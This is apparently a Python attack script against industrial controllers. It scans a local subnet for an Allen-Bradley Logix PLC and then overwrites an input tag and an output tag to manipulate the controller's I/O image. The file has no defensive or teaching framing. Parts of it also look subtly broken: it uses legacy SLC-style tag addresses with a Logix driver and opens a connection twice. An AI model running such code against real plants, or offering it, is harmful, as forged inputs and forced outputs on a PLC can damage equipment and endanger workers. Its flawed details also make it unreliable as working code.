import socket
import pycomm3
from pycomm3 import LogixDriver

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with LogixDriver(ip) as plc:
                if plc.open():
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            continue
    print("PLC not found in the specified subnet.")
    return None

# Function to manipulate the I/O image
def manipulate_io_image(plc_ip, input_tag, output_tag, input_value, output_value):
    try:
        with LogixDriver(plc_ip) as plc:
            if plc.open():
                # Override the input tag
                plc.write((input_tag, input_value))
                print(f"Input tag {input_tag} set to {input_value}")

                # Override the output tag
                plc.write((output_tag, output_value))
                print(f"Output tag {output_tag} set to {output_value}")
            else:
                print("Failed to connect to the PLC.")
    except Exception as e:
        print(f"Error: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        # Define the tags and values to manipulate
        input_tag = "B3:0/0"  # Example input tag
        output_tag = "O:0/0"  # Example output tag
        input_value = 1  # Example input value (1 for ON, 0 for OFF)
        output_value = 0  # Example output value (1 for ON, 0 for OFF)

        # Manipulate the I/O image
        manipulate_io_image(plc_ip, input_tag, output_tag, input_value, output_value)

if __name__ == "__main__":
    main()